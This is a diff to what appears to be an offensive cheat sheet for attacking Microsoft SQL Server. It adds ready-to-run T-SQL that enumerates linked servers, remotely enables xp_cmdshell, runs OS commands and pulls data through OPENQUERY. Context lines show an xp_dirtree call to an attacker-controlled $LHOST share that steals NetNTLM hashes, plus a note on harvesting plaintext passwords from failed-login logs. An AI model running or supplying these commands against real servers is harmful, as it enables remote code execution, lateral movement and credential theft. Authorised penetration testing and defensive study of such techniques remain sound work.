@@ -291,6 +291,22 @@ EXEC master..xp_dirtree '\\$LHOST\share\file.txt'   # alternate syntax
 
 > xp_cmdshell = OS command execution. xp_dirtree = steal NetNTLM hash.
 
+**Linked server lateral movement:**
+
+```sql
+-- Enumerate linked servers
+EXEC sp_linkedservers;
+SELECT name, provider FROM sys.servers WHERE is_linked = 1;
+
+-- Query linked server (RCE if sysadmin on remote)
+EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE') AT [<linked_server_name>]
+EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [<linked_server_name>]
+EXEC ('EXEC xp_cmdshell ''whoami''') AT [<linked_server_name>]
+
+-- Data exfil via linked server
+SELECT * FROM OPENQUERY([<linked_server>], 'SELECT name FROM master..sysdatabases')
+```
+
 **Post-compromise: SQL Server error log credential hunting**
 
 SQL Server logs the username field verbatim for every failed login (Error 18456). If a user typed their password into the username field, it appears in plaintext in the log.
